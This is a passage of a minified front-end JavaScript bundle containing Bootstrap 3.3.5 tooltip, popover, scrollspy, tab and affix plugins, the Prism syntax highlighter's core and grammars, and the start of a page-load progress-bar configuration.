                    left: Math.round(e.left)
                })
            }
        }, e), 0),
        n.addClass("in");
        var o = n[0].offsetWidth
          , l = n[0].offsetHeight;
        "top" == t && l != a && (e.top = e.top + a - l);
        var d = this.getViewportAdjustedDelta(t, e, o, l);
        d.left ? e.left += d.left : e.top += d.top;
        var u = /top|bottom/.test(t)
          , c = u ? 2 * d.left - i + o : 2 * d.top - a + l
          , h = u ? "offsetWidth" : "offsetHeight";
        n.offset(e),
        this.replaceArrow(c, n[0][h], u)
    }
    ,
    _.prototype.replaceArrow = function(e, t, n) {
        this.arrow().css(n ? "left" : "top", 50 * (1 - e / t) + "%").css(n ? "top" : "left", "")
    }
    ,
    _.prototype.setContent = function() {
        var e = this.tip()
          , t = this.getTitle();
        e.find(".tooltip-inner")[this.options.html ? "html" : "text"](t),
        e.removeClass("fade in top bottom left right")
    }
    ,
    _.prototype.hide = function(e) {
        function t() {
            "in" != n.hoverState && i.detach(),
            n.$element.removeAttr("aria-describedby").trigger("hidden.bs." + n.type),
            e && e()
        }
        var n = this
          , i = p(this.$tip)
          , a = p.Event("hide.bs." + this.type);
        return this.$element.trigger(a),
        a.isDefaultPrevented() ? void 0 : (i.removeClass("in"),
        p.support.transition && i.hasClass("fade") ? i.one("bsTransitionEnd", t).emulateTransitionEnd(_.TRANSITION_DURATION) : t(),
        this.hoverState = null,
        this)
    }
    ,
    _.prototype.fixTitle = function() {
        var e = this.$element;
        !e.attr("title") && "string" == typeof e.attr("data-original-title") || e.attr("data-original-title", e.attr("title") || "").attr("title", "")
    }
    ,
    _.prototype.hasContent = function() {
        return this.getTitle()
    }
    ,
    _.prototype.getPosition = function(e) {
        var t = (e = e || this.$element)[0]
          , n = "BODY" == t.tagName
          , i = t.getBoundingClientRect();
        null == i.width && (i = p.extend({}, i, {
            width: i.right - i.left,
            height: i.bottom - i.top
        }));
        var a = n ? {
            top: 0,
            left: 0
        } : e.offset()
          , s = {
            scroll: n ? document.documentElement.scrollTop || document.body.scrollTop : e.scrollTop()
        }
          , r = n ? {
            width: p(window).width(),
            height: p(window).height()
        } : null;
        return p.extend({}, i, s, r, a)
    }
    ,
    _.prototype.getCalculatedOffset = function(e, t, n, i) {
        return "bottom" == e ? {
            top: t.top + t.height,
            left: t.left + t.width / 2 - n / 2
        } : "top" == e ? {
            top: t.top - i,
            left: t.left + t.width / 2 - n / 2
        } : "left" == e ? {
            top: t.top + t.height / 2 - i / 2,
            left: t.left - n
        } : {
            top: t.top + t.height / 2 - i / 2,
            left: t.left + t.width
        }
    }
    ,
    _.prototype.getViewportAdjustedDelta = function(e, t, n, i) {
        var a = {
            top: 0,
            left: 0
        };
        if (!this.$viewport)
            return a;
        var s = this.options.viewport && this.options.viewport.padding || 0
          , r = this.getPosition(this.$viewport);
        if (/right|left/.test(e)) {
            var o = t.top - s - r.scroll
              , l = t.top + s - r.scroll + i;
            o < r.top ? a.top = r.top - o : l > r.top + r.height && (a.top = r.top + r.height - l)
        } else {
            var d = t.left - s
              , u = t.left + s + n;
            d < r.left ? a.left = r.left - d : u > r.right && (a.left = r.left + r.width - u)
        }
        return a
    }
    ,
    _.prototype.getTitle = function() {
        var e = this.$element
          , t = this.options;
        return e.attr("data-original-title") || ("function" == typeof t.title ? t.title.call(e[0]) : t.title)
    }
    ,
    _.prototype.getUID = function(e) {
        for (; e += ~~(1e6 * Math.random()),
        document.getElementById(e); )
            ;
        return e
    }
    ,
    _.prototype.tip = function() {
        if (!this.$tip && (this.$tip = p(this.options.template),
        1 != this.$tip.length))
            throw new Error(this.type + " `template` option must consist of exactly 1 top-level element!");
        return this.$tip
    }
    ,
    _.prototype.arrow = function() {
        return this.$arrow = this.$arrow || this.tip().find(".tooltip-arrow")
    }
    ,
    _.prototype.enable = function() {
        this.enabled = !0
    }
    ,
    _.prototype.disable = function() {
        this.enabled = !1
    }
    ,
    _.prototype.toggleEnabled = function() {
        this.enabled = !this.enabled
    }
    ,
    _.prototype.toggle = function(e) {
        var t = this;
        e && ((t = p(e.currentTarget).data("bs." + this.type)) || (t = new this.constructor(e.currentTarget,this.getDelegateOptions()),
        p(e.currentTarget).data("bs." + this.type, t))),
        e ? (t.inState.click = !t.inState.click,
        t.isInStateTrue() ? t.enter(t) : t.leave(t)) : t.tip().hasClass("in") ? t.leave(t) : t.enter(t)
    }
    ,
    _.prototype.destroy = function() {
        var e = this;
        clearTimeout(this.timeout),
        this.hide(function() {
            e.$element.off("." + e.type).removeData("bs." + e.type),
            e.$tip && e.$tip.detach(),
            e.$tip = null,
            e.$arrow = null,
            e.$viewport = null
        })
    }
    ;
    var e = p.fn.tooltip;
    p.fn.tooltip = function(i) {
        return this.each(function() {
            var e = p(this)
              , t = e.data("bs.tooltip")
              , n = "object" == typeof i && i;
            !t && /destroy|hide/.test(i) || (t || e.data("bs.tooltip", t = new _(this,n)),
            "string" == typeof i && t[i]())
        })
    }
    ,
    p.fn.tooltip.Constructor = _,
    p.fn.tooltip.noConflict = function() {
        return p.fn.tooltip = e,
        this
    }
}(jQuery),
function(a) {
    "use strict";
    function s(e, t) {
        this.init("popover", e, t)
    }
    if (!a.fn.tooltip)
        throw new Error("Popover requires tooltip.js");
    s.VERSION = "3.3.5",
    s.DEFAULTS = a.extend({}, a.fn.tooltip.Constructor.DEFAULTS, {
        placement: "right",
        trigger: "click",
        content: "",
        template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'
    }),
    ((s.prototype = a.extend({}, a.fn.tooltip.Constructor.prototype)).constructor = s).prototype.getDefaults = function() {
        return s.DEFAULTS
    }
    ,
    s.prototype.setContent = function() {
        var e = this.tip()
          , t = this.getTitle()
          , n = this.getContent();
        e.find(".popover-title")[this.options.html ? "html" : "text"](t),
        e.find(".popover-content").children().detach().end()[this.options.html ? "string" == typeof n ? "html" : "append" : "text"](n),
        e.removeClass("fade top bottom left right in"),
        e.find(".popover-title").html() || e.find(".popover-title").hide()
    }
    ,
    s.prototype.hasContent = function() {
        return this.getTitle() || this.getContent()
    }
    ,
    s.prototype.getContent = function() {
        var e = this.$element
          , t = this.options;
        return e.attr("data-content") || ("function" == typeof t.content ? t.content.call(e[0]) : t.content)
    }
    ,
    s.prototype.arrow = function() {
        return this.$arrow = this.$arrow || this.tip().find(".arrow")
    }
    ;
    var e = a.fn.popover;
    a.fn.popover = function(i) {
        return this.each(function() {
            var e = a(this)
              , t = e.data("bs.popover")
              , n = "object" == typeof i && i;
            !t && /destroy|hide/.test(i) || (t || e.data("bs.popover", t = new s(this,n)),
            "string" == typeof i && t[i]())
        })
    }
    ,
    a.fn.popover.Constructor = s,
    a.fn.popover.noConflict = function() {
        return a.fn.popover = e,
        this
    }
}(jQuery),
function(s) {
    "use strict";
    function a(e, t) {
        this.$body = s(document.body),
        this.$scrollElement = s(s(e).is(document.body) ? window : e),
        this.options = s.extend({}, a.DEFAULTS, t),
        this.selector = (this.options.target || "") + " .nav li > a",
        this.offsets = [],
        this.targets = [],
        this.activeTarget = null,
        this.scrollHeight = 0,
        this.$scrollElement.on("scroll.bs.scrollspy", s.proxy(this.process, this)),
        this.refresh(),
        this.process()
    }
    function t(i) {
        return this.each(function() {
            var e = s(this)
              , t = e.data("bs.scrollspy")
              , n = "object" == typeof i && i;
            t || e.data("bs.scrollspy", t = new a(this,n)),
            "string" == typeof i && t[i]()
        })
    }
    a.VERSION = "3.3.5",
    a.DEFAULTS = {
        offset: 10
    },
    a.prototype.getScrollHeight = function() {
        return this.$scrollElement[0].scrollHeight || Math.max(this.$body[0].scrollHeight, document.documentElement.scrollHeight)
    }
    ,
    a.prototype.refresh = function() {
        var e = this
          , i = "offset"
          , a = 0;
        this.offsets = [],
        this.targets = [],
        this.scrollHeight = this.getScrollHeight(),
        s.isWindow(this.$scrollElement[0]) || (i = "position",
        a = this.$scrollElement.scrollTop()),
        this.$body.find(this.selector).map(function() {
            var e = s(this)
              , t = e.data("target") || e.attr("href")
              , n = /^#./.test(t) && s(t);
            return n && n.length && n.is(":visible") ? [[n[i]().top + a, t]] : null
        }).sort(function(e, t) {
            return e[0] - t[0]
        }).each(function() {
            e.offsets.push(this[0]),
            e.targets.push(this[1])
        })
    }
    ,
    a.prototype.process = function() {
        var e, t = this.$scrollElement.scrollTop() + this.options.offset, n = this.getScrollHeight(), i = this.options.offset + n - this.$scrollElement.height(), a = this.offsets, s = this.targets, r = this.activeTarget;
        if (this.scrollHeight != n && this.refresh(),
        i <= t)
            return r != (e = s[s.length - 1]) && this.activate(e);
        if (r && t < a[0])
            return this.activeTarget = null,
            this.clear();
        for (e = a.length; e--; )
            r != s[e] && t >= a[e] && (void 0 === a[e + 1] || t < a[e + 1]) && this.activate(s[e])
    }
    ,
    a.prototype.activate = function(e) {
        this.activeTarget = e,
        this.clear();
        var t = this.selector + '[data-target="' + e + '"],' + this.selector + '[href="' + e + '"]'
          , n = s(t).parents("li").addClass("active");
        n.parent(".dropdown-menu").length && (n = n.closest("li.dropdown").addClass("active")),
        n.trigger("activate.bs.scrollspy")
    }
    ,
    a.prototype.clear = function() {
        s(this.selector).parentsUntil(this.options.target, ".active").removeClass("active")
    }
    ;
    var e = s.fn.scrollspy;
    s.fn.scrollspy = t,
    s.fn.scrollspy.Constructor = a,
    s.fn.scrollspy.noConflict = function() {
        return s.fn.scrollspy = e,
        this
    }
    ,
    s(window).on("load.bs.scrollspy.data-api", function() {
        s('[data-spy="scroll"]').each(function() {
            var e = s(this);
            t.call(e, e.data())
        })
    })
}(jQuery),
function(o) {
    "use strict";
    function t(n) {
        return this.each(function() {
            var e = o(this)
              , t = e.data("bs.tab");
            t || e.data("bs.tab", t = new r(this)),
            "string" == typeof n && t[n]()
        })
    }
    function r(e) {
        this.element = o(e)
    }
    r.VERSION = "3.3.5",
    r.TRANSITION_DURATION = 150,
    r.prototype.show = function() {
        var e = this.element
          , t = e.closest("ul:not(.dropdown-menu)")
          , n = e.data("target");
        if (n || (n = (n = e.attr("href")) && n.replace(/.*(?=#[^\s]*$)/, "")),
        !e.parent("li").hasClass("active")) {
            var i = t.find(".active:last a")
              , a = o.Event("hide.bs.tab", {
                relatedTarget: e[0]
            })
              , s = o.Event("show.bs.tab", {
                relatedTarget: i[0]
            });
            if (i.trigger(a),
            e.trigger(s),
            !s.isDefaultPrevented() && !a.isDefaultPrevented()) {
                var r = o(n);
                this.activate(e.closest("li"), t),
                this.activate(r, r.parent(), function() {
                    i.trigger({
                        type: "hidden.bs.tab",
                        relatedTarget: e[0]
                    }),
                    e.trigger({
                        type: "shown.bs.tab",
                        relatedTarget: i[0]
                    })
                })
            }
        }
    }
    ,
    r.prototype.activate = function(e, t, n) {
        function i() {
            a.removeClass("active").find("> .dropdown-menu > .active").removeClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded", !1),
            e.addClass("active").find('[data-toggle="tab"]').attr("aria-expanded", !0),
            s ? (e[0].offsetWidth,
            e.addClass("in")) : e.removeClass("fade"),
            e.parent(".dropdown-menu").length && e.closest("li.dropdown").addClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded", !0),
            n && n()
        }
        var a = t.find("> .active")
          , s = n && o.support.transition && (a.length && a.hasClass("fade") || !!t.find("> .fade").length);
        a.length && s ? a.one("bsTransitionEnd", i).emulateTransitionEnd(r.TRANSITION_DURATION) : i(),
        a.removeClass("in")
    }
    ;
    var e = o.fn.tab;
    o.fn.tab = t,
    o.fn.tab.Constructor = r,
    o.fn.tab.noConflict = function() {
        return o.fn.tab = e,
        this
    }
    ;
    function n(e) {
        e.preventDefault(),
        t.call(o(this), "show")
    }
    o(document).on("click.bs.tab.data-api", '[data-toggle="tab"]', n).on("click.bs.tab.data-api", '[data-toggle="pill"]', n)
}(jQuery),
function(l) {
    "use strict";
    function n(i) {
        return this.each(function() {
            var e = l(this)
              , t = e.data("bs.affix")
              , n = "object" == typeof i && i;
            t || e.data("bs.affix", t = new d(this,n)),
            "string" == typeof i && t[i]()
        })
    }
    var d = function(e, t) {
        this.options = l.extend({}, d.DEFAULTS, t),
        this.$target = l(this.options.target).on("scroll.bs.affix.data-api", l.proxy(this.checkPosition, this)).on("click.bs.affix.data-api", l.proxy(this.checkPositionWithEventLoop, this)),
        this.$element = l(e),
        this.affixed = null,
        this.unpin = null,
        this.pinnedOffset = null,
        this.checkPosition()
    };
    d.VERSION = "3.3.5",
    d.RESET = "affix affix-top affix-bottom",
    d.DEFAULTS = {
        offset: 0,
        target: window
    },
    d.prototype.getState = function(e, t, n, i) {
        var a = this.$target.scrollTop()
          , s = this.$element.offset()
          , r = this.$target.height();
        if (null != n && "top" == this.affixed)
            return a < n && "top";
        if ("bottom" == this.affixed)
            return null != n ? !(a + this.unpin <= s.top) && "bottom" : !(a + r <= e - i) && "bottom";
        var o = null == this.affixed
          , l = o ? a : s.top;
        return null != n && a <= n ? "top" : null != i && e - i <= l + (o ? r : t) && "bottom"
    }
    ,
    d.prototype.getPinnedOffset = function() {
        if (this.pinnedOffset)
            return this.pinnedOffset;
        this.$element.removeClass(d.RESET).addClass("affix");
        var e = this.$target.scrollTop()
          , t = this.$element.offset();
        return this.pinnedOffset = t.top - e
    }
    ,
    d.prototype.checkPositionWithEventLoop = function() {
        setTimeout(l.proxy(this.checkPosition, this), 1)
    }
    ,
    d.prototype.checkPosition = function() {
        if (this.$element.is(":visible")) {
            var e = this.$element.height()
              , t = this.options.offset
              , n = t.top
              , i = t.bottom
              , a = Math.max(l(document).height(), l(document.body).height());
            "object" != typeof t && (i = n = t),
            "function" == typeof n && (n = t.top(this.$element)),
            "function" == typeof i && (i = t.bottom(this.$element));
            var s = this.getState(a, e, n, i);
            if (this.affixed != s) {
                null != this.unpin && this.$element.css("top", "");
                var r = "affix" + (s ? "-" + s : "")
                  , o = l.Event(r + ".bs.affix");
                if (this.$element.trigger(o),
                o.isDefaultPrevented())
                    return;
                this.affixed = s,
                this.unpin = "bottom" == s ? this.getPinnedOffset() : null,
                this.$element.removeClass(d.RESET).addClass(r).trigger(r.replace("affix", "affixed") + ".bs.affix")
            }
            "bottom" == s && this.$element.offset({
                top: a - e - i
            })
        }
    }
    ;
    var e = l.fn.affix;
    l.fn.affix = n,
    l.fn.affix.Constructor = d,
    l.fn.affix.noConflict = function() {
        return l.fn.affix = e,
        this
    }
    ,
    l(window).on("load", function() {
        l('[data-spy="affix"]').each(function() {
            var e = l(this)
              , t = e.data();
            t.offset = t.offset || {},
            null != t.offsetBottom && (t.offset.bottom = t.offsetBottom),
            null != t.offsetTop && (t.offset.top = t.offsetTop),
            n.call(e, t)
        })
    })
}(jQuery);
var _self = "undefined" != typeof window ? window : "undefined" != typeof WorkerGlobalScope && self instanceof WorkerGlobalScope ? self : {}
  , Prism = function() {
    var l = /\blang(?:uage)?-(\w+)\b/i
      , t = 0
      , j = _self.Prism = {
        manual: _self.Prism && _self.Prism.manual,
        disableWorkerMessageHandler: _self.Prism && _self.Prism.disableWorkerMessageHandler,
        util: {
            encode: function(e) {
                return e instanceof r ? new r(e.type,j.util.encode(e.content),e.alias) : "Array" === j.util.type(e) ? e.map(j.util.encode) : e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/\u00a0/g, " ")
            },
            type: function(e) {
                return Object.prototype.toString.call(e).match(/\[object (\w+)\]/)[1]
            },
            objId: function(e) {
                return e.__id || Object.defineProperty(e, "__id", {
                    value: ++t
                }),
                e.__id
            },
            clone: function(e) {
                switch (j.util.type(e)) {
                case "Object":
                    var t = {};
                    for (var n in e)
                        e.hasOwnProperty(n) && (t[n] = j.util.clone(e[n]));
                    return t;
                case "Array":
                    return e.map(function(e) {
                        return j.util.clone(e)
                    })
                }
                return e
            }
        },
        languages: {
            extend: function(e, t) {
                var n = j.util.clone(j.languages[e]);
                for (var i in t)
                    n[i] = t[i];
                return n
            },
            insertBefore: function(n, e, t, i) {
                var a = (i = i || j.languages)[n];
                if (2 == arguments.length) {
                    for (var s in t = e)
                        t.hasOwnProperty(s) && (a[s] = t[s]);
                    return a
                }
                var r = {};
                for (var o in a)
                    if (a.hasOwnProperty(o)) {
                        if (o == e)
                            for (var s in t)
                                t.hasOwnProperty(s) && (r[s] = t[s]);
                        r[o] = a[o]
                    }
                return j.languages.DFS(j.languages, function(e, t) {
                    t === i[n] && e != n && (this[e] = r)
                }),
                i[n] = r
            },
            DFS: function(e, t, n, i) {
                for (var a in i = i || {},
                e)
                    e.hasOwnProperty(a) && (t.call(e, a, e[a], n || a),
                    "Object" !== j.util.type(e[a]) || i[j.util.objId(e[a])] ? "Array" !== j.util.type(e[a]) || i[j.util.objId(e[a])] || (i[j.util.objId(e[a])] = !0,
                    j.languages.DFS(e[a], t, a, i)) : (i[j.util.objId(e[a])] = !0,
                    j.languages.DFS(e[a], t, null, i)))
            }
        },
        plugins: {},
        highlightAll: function(e, t) {
            var n = {
                callback: t,
                selector: 'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'
            };
            j.hooks.run("before-highlightall", n);
            for (var i, a = n.elements || document.querySelectorAll(n.selector), s = 0; i = a[s++]; )
                j.highlightElement(i, !0 === e, n.callback)
        },
        highlightElement: function(e, t, n) {
            for (var i, a, s = e; s && !l.test(s.className); )
                s = s.parentNode;
            s && (i = (s.className.match(l) || [, ""])[1].toLowerCase(),
            a = j.languages[i]),
            e.className = e.className.replace(l, "").replace(/\s+/g, " ") + " language-" + i,
            e.parentNode && (s = e.parentNode,
            /pre/i.test(s.nodeName) && (s.className = s.className.replace(l, "").replace(/\s+/g, " ") + " language-" + i));
            var r = {
                element: e,
                language: i,
                grammar: a,
                code: e.textContent
            };
            if (j.hooks.run("before-sanity-check", r),
            !r.code || !r.grammar)
                return r.code && (j.hooks.run("before-highlight", r),
                r.element.textContent = r.code,
                j.hooks.run("after-highlight", r)),
                void j.hooks.run("complete", r);
            if (j.hooks.run("before-highlight", r),
            t && _self.Worker) {
                var o = new Worker(j.filename);
                o.onmessage = function(e) {
                    r.highlightedCode = e.data,
                    j.hooks.run("before-insert", r),
                    r.element.innerHTML = r.highlightedCode,
                    n && n.call(r.element),
                    j.hooks.run("after-highlight", r),
                    j.hooks.run("complete", r)
                }
                ,
                o.postMessage(JSON.stringify({
                    language: r.language,
                    code: r.code,
                    immediateClose: !0
                }))
            } else
                r.highlightedCode = j.highlight(r.code, r.grammar, r.language),
                j.hooks.run("before-insert", r),
                r.element.innerHTML = r.highlightedCode,
                n && n.call(e),
                j.hooks.run("after-highlight", r),
                j.hooks.run("complete", r)
        },
        highlight: function(e, t, n) {
            var i = j.tokenize(e, t);
            return r.stringify(j.util.encode(i), n)
        },
        matchGrammar: function(e, t, n, i, a, s, r) {
            var o = j.Token;
            for (var l in n)
                if (n.hasOwnProperty(l) && n[l]) {
                    if (l == r)
                        return;
                    var d = n[l];
                    d = "Array" === j.util.type(d) ? d : [d];
                    for (var u = 0; u < d.length; ++u) {
                        var c = d[u]
                          , h = c.inside
                          , m = !!c.lookbehind
                          , f = !!c.greedy
                          , p = 0
                          , _ = c.alias;
                        if (f && !c.pattern.global) {
                            var g = c.pattern.toString().match(/[imuy]*$/)[0];
                            c.pattern = RegExp(c.pattern.source, g + "g")
                        }
                        c = c.pattern || c;
                        for (var y = i, v = a; y < t.length; v += t[y].length,
                        ++y) {
                            var M = t[y];
                            if (t.length > e.length)
                                return;
                            if (!(M instanceof o)) {
                                c.lastIndex = 0;
                                var L = 1;
                                if (!(T = c.exec(M)) && f && y != t.length - 1) {
                                    if (c.lastIndex = v,
                                    !(T = c.exec(e)))
                                        break;
                                    for (var b = T.index + (m ? T[1].length : 0), k = T.index + T[0].length, D = y, Y = v, w = t.length; D < w && (Y < k || !t[D].type && !t[D - 1].greedy); ++D)
                                        (Y += t[D].length) <= b && (++y,
                                        v = Y);
                                    if (t[y]instanceof o || t[D - 1].greedy)
                                        continue;
                                    L = D - y,
                                    M = e.slice(v, Y),
                                    T.index -= v
                                }
                                if (T) {
                                    m && (p = T[1].length);
                                    k = (b = T.index + p) + (T = T[0].slice(p)).length;
                                    var T, S = M.slice(0, b), x = M.slice(k), H = [y, L];
                                    S && (++y,
                                    v += S.length,
                                    H.push(S));
                                    var E = new o(l,h ? j.tokenize(T, h) : T,_,T,f);
                                    if (H.push(E),
                                    x && H.push(x),
                                    Array.prototype.splice.apply(t, H),
                                    1 != L && j.matchGrammar(e, t, n, y, v, !0, l),
                                    s)
                                        break
                                } else if (s)
                                    break
                            }
                        }
                    }
                }
        },
        tokenize: function(e, t) {
            var n = [e]
              , i = t.rest;
            if (i) {
                for (var a in i)
                    t[a] = i[a];
                delete t.rest
            }
            return j.matchGrammar(e, n, t, 0, 0, !1),
            n
        },
        hooks: {
            all: {},
            add: function(e, t) {
                var n = j.hooks.all;
                n[e] = n[e] || [],
                n[e].push(t)
            },
            run: function(e, t) {
                var n = j.hooks.all[e];
                if (n && n.length)
                    for (var i, a = 0; i = n[a++]; )
                        i(t)
            }
        }
    }
      , r = j.Token = function(e, t, n, i, a) {
        this.type = e,
        this.content = t,
        this.alias = n,
        this.length = 0 | (i || "").length,
        this.greedy = !!a
    }
    ;
    if (r.stringify = function(t, n, e) {
        if ("string" == typeof t)
            return t;
        if ("Array" === j.util.type(t))
            return t.map(function(e) {
                return r.stringify(e, n, t)
            }).join("");
        var i = {
            type: t.type,
            content: r.stringify(t.content, n, e),
            tag: "span",
            classes: ["token", t.type],
            attributes: {},
            language: n,
            parent: e
        };
        if (t.alias) {
            var a = "Array" === j.util.type(t.alias) ? t.alias : [t.alias];
            Array.prototype.push.apply(i.classes, a)
        }
        j.hooks.run("wrap", i);
        var s = Object.keys(i.attributes).map(function(e) {
            return e + '="' + (i.attributes[e] || "").replace(/"/g, "&quot;") + '"'
        }).join(" ");
        return "<" + i.tag + ' class="' + i.classes.join(" ") + '"' + (s ? " " + s : "") + ">" + i.content + "</" + i.tag + ">"
    }
    ,
    !_self.document)
        return _self.addEventListener && (j.disableWorkerMessageHandler || _self.addEventListener("message", function(e) {
            var t = JSON.parse(e.data)
              , n = t.language
              , i = t.code
              , a = t.immediateClose;
            _self.postMessage(j.highlight(i, j.languages[n], n)),
            a && _self.close()
        }, !1)),
        _self.Prism;
    var e = document.currentScript || [].slice.call(document.getElementsByTagName("script")).pop();
    return e && (j.filename = e.src,
    j.manual || e.hasAttribute("data-manual") || ("loading" !== document.readyState ? window.requestAnimationFrame ? window.requestAnimationFrame(j.highlightAll) : window.setTimeout(j.highlightAll, 16) : document.addEventListener("DOMContentLoaded", j.highlightAll))),
    _self.Prism
}();
"undefined" != typeof module && module.exports && (module.exports = Prism),
"undefined" != typeof global && (global.Prism = Prism),
Prism.languages.markup = {
    comment: /<!--[\s\S]*?-->/,
    prolog: /<\?[\s\S]+?\?>/,
    doctype: /<!DOCTYPE[\s\S]+?>/i,
    cdata: /<!\[CDATA\[[\s\S]*?]]>/i,
    tag: {
        pattern: /<\/?(?!\d)[^\s>\/=$<]+(?:\s+[^\s>\/=]+(?:=(?:("|')(?:\\[\s\S]|(?!\1)[^\\])*\1|[^\s'">=]+))?)*\s*\/?>/i,
        inside: {
            tag: {
                pattern: /^<\/?[^\s>\/]+/i,
                inside: {
                    punctuation: /^<\/?/,
                    namespace: /^[^\s>\/:]+:/
                }
            },
            "attr-value": {
                pattern: /=(?:("|')(?:\\[\s\S]|(?!\1)[^\\])*\1|[^\s'">=]+)/i,
                inside: {
                    punctuation: [/^=/, {
                        pattern: /(^|[^\\])["']/,
                        lookbehind: !0
                    }]
                }
            },
            punctuation: /\/?>/,
            "attr-name": {
                pattern: /[^\s>\/]+/,
                inside: {
                    namespace: /^[^\s>\/:]+:/
                }
            }
        }
    },
    entity: /&#?[\da-z]{1,8};/i
},
Prism.languages.markup.tag.inside["attr-value"].inside.entity = Prism.languages.markup.entity,
Prism.hooks.add("wrap", function(e) {
    "entity" === e.type && (e.attributes.title = e.content.replace(/&amp;/, "&"))
}),
Prism.languages.xml = Prism.languages.markup,
Prism.languages.html = Prism.languages.markup,
Prism.languages.mathml = Prism.languages.markup,
Prism.languages.svg = Prism.languages.markup,
Prism.languages.css = {
    comment: /\/\*[\s\S]*?\*\//,
    atrule: {
        pattern: /@[\w-]+?.*?(?:;|(?=\s*\{))/i,
        inside: {
            rule: /@[\w-]+/
        }
    },
    url: /url\((?:(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1|.*?)\)/i,
    selector: /[^{}\s][^{};]*?(?=\s*\{)/,
    string: {
        pattern: /("|')(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,
        greedy: !0
    },
    property: /[-_a-z\xA0-\uFFFF][-\w\xA0-\uFFFF]*(?=\s*:)/i,
    important: /\B!important\b/i,
    function: /[-a-z0-9]+(?=\()/i,
    punctuation: /[(){};:]/
},
Prism.languages.css.atrule.inside.rest = Prism.util.clone(Prism.languages.css),
Prism.languages.markup && (Prism.languages.insertBefore("markup", "tag", {
    style: {
        pattern: /(<style[\s\S]*?>)[\s\S]*?(?=<\/style>)/i,
        lookbehind: !0,
        inside: Prism.languages.css,
        alias: "language-css"
    }
}),
Prism.languages.insertBefore("inside", "attr-value", {
    "style-attr": {
        pattern: /\s*style=("|')(?:\\[\s\S]|(?!\1)[^\\])*\1/i,
        inside: {
            "attr-name": {
                pattern: /^\s*style/i,
                inside: Prism.languages.markup.tag.inside
            },
            punctuation: /^\s*=\s*['"]|['"]\s*$/,
            "attr-value": {
                pattern: /.+/i,
                inside: Prism.languages.css
            }
        },
        alias: "language-css"
    }
}, Prism.languages.markup.tag)),
Prism.languages.clike = {
    comment: [{
        pattern: /(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,
        lookbehind: !0
    }, {
        pattern: /(^|[^\\:])\/\/.*/,
        lookbehind: !0
    }],
    string: {
        pattern: /(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,
        greedy: !0
    },
    "class-name": {
        pattern: /((?:\b(?:class|interface|extends|implements|trait|instanceof|new)\s+)|(?:catch\s+\())[\w.\\]+/i,
        lookbehind: !0,
        inside: {
            punctuation: /[.\\]/
        }
    },
    keyword: /\b(?:if|else|while|do|for|return|in|instanceof|function|new|try|throw|catch|finally|null|break|continue)\b/,
    boolean: /\b(?:true|false)\b/,
    function: /[a-z0-9_]+(?=\()/i,
    number: /\b-?(?:0x[\da-f]+|\d*\.?\d+(?:e[+-]?\d+)?)\b/i,
    operator: /--?|\+\+?|!=?=?|<=?|>=?|==?=?|&&?|\|\|?|\?|\*|\/|~|\^|%/,
    punctuation: /[{}[\];(),.:]/
},
Prism.languages.javascript = Prism.languages.extend("clike", {
    keyword: /\b(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|var|void|while|with|yield)\b/,
    number: /\b-?(?:0[xX][\dA-Fa-f]+|0[bB][01]+|0[oO][0-7]+|\d*\.?\d+(?:[Ee][+-]?\d+)?|NaN|Infinity)\b/,
    function: /[_$a-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\s*\()/i,
    operator: /-[-=]?|\+[+=]?|!=?=?|<<?=?|>>?>?=?|=(?:==?|>)?|&[&=]?|\|[|=]?|\*\*?=?|\/=?|~|\^=?|%=?|\?|\.{3}/
}),
Prism.languages.insertBefore("javascript", "keyword", {
    regex: {
        pattern: /(^|[^\/])\/(?!\/)(\[[^\]\r\n]+]|\\.|[^\/\\\[\r\n])+\/[gimyu]{0,5}(?=\s*($|[\r\n,.;})]))/,
        lookbehind: !0,
        greedy: !0
    },
    "function-variable": {
        pattern: /[_$a-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\s*=\s*(?:function\b|(?:\([^()]*\)|[_$a-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*)\s*=>))/i,
        alias: "function"
    }
}),
Prism.languages.insertBefore("javascript", "string", {
    "template-string": {
        pattern: /`(?:\\[\s\S]|[^\\`])*`/,
        greedy: !0,
        inside: {
            interpolation: {
                pattern: /\$\{[^}]+\}/,
                inside: {
                    "interpolation-punctuation": {
                        pattern: /^\$\{|\}$/,
                        alias: "punctuation"
                    },
                    rest: Prism.languages.javascript
                }
            },
            string: /[\s\S]+/
        }
    }
}),
Prism.languages.markup && Prism.languages.insertBefore("markup", "tag", {
    script: {
        pattern: /(<script[\s\S]*?>)[\s\S]*?(?=<\/script>)/i,
        lookbehind: !0,
        inside: Prism.languages.javascript,
        alias: "language-javascript"
    }
}),
Prism.languages.js = Prism.languages.javascript,
function() {
    function e(e, t) {
        function n() {
            this.constructor = e
        }
        for (var i in t)
            K.call(t, i) && (e[i] = t[i]);
        return n.prototype = t.prototype,
        e.prototype = new n,
        e.__super__ = t.prototype,
        e
    }
    var l, d, t, n, s, i, a, r, o, y, u, c, v, h, m, f, p, M, L, _, g, b, k, D, Y, w, T, S, x, H, E, j, C, A, P, O, N, F, W, I, z, R, $, B, q, U, J, V, G, X = [].slice, K = {}.hasOwnProperty, Q = [].indexOf || function(e) {
        for (var t = 0, n = this.length; t < n; t++)
            if (t in this && this[t] === e)
                return t;
        return -1
    }
    ;
    for (g = {
        catchupTime: 100,
        initialRate: .03,
        minTime: 250,
        ghostTime: 100,
        maxProgressPerFrame: 20,
        easeFactor: 1.25,
        startOnPageLoad: !0,
        restartOnPushState: !0,
        restartOnRequestAfter: 500,
        target: "body",
        elements: {
            checkInterval: 100,
            selectors: ["body"]
        },
        eventLag: {
            minSamples: 10,
            sampleCount: 3,
            lagThreshold: 3
        },
        ajax: {
            trackMethods: ["GET"],
            trackWebSockets: !0,
            ignoreURLs: []
        }
